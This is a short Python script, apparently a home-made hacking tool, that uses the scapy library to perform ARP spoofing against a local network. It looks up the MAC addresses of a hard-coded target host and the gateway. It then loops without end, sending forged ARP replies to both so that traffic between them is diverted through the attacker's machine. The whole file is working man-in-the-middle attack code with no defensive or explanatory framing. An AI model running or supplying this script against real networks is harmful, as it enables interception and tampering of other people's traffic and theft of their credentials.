import scapy.all as scapy
import time

def spoof(target_ip, target_mac, spoof_ip):
    spoof_arp_packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    scapy.send(spoof_arp_packet, verbose = 0)

def get_mac(ip):
    arp_request = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    reply, something = scapy.srp(arp_request, timeout = 2, verbose = 0)
    if reply:
        return reply[0][1].src
    return None

def wait_till_mac_found(ip):
    mac = None
    while not mac:
        mac = get_mac(ip)
        if not mac:
            print("MAC address for {} not found\n".format(ip))
    print(f"target mac address is: {mac}")
    return mac



target_ip = "192.168.1.112" 
gateway_ip = "192.168.1.1"
target_mac = wait_till_mac_found(target_ip)
gateway_mac = wait_till_mac_found(gateway_ip)


while True:
    spoof(target_ip, target_mac, gateway_ip)
    spoof(target_ip=gateway_ip, target_mac=gateway_mac, spoof_ip=target_ip)
    print("Spoofing is active")


        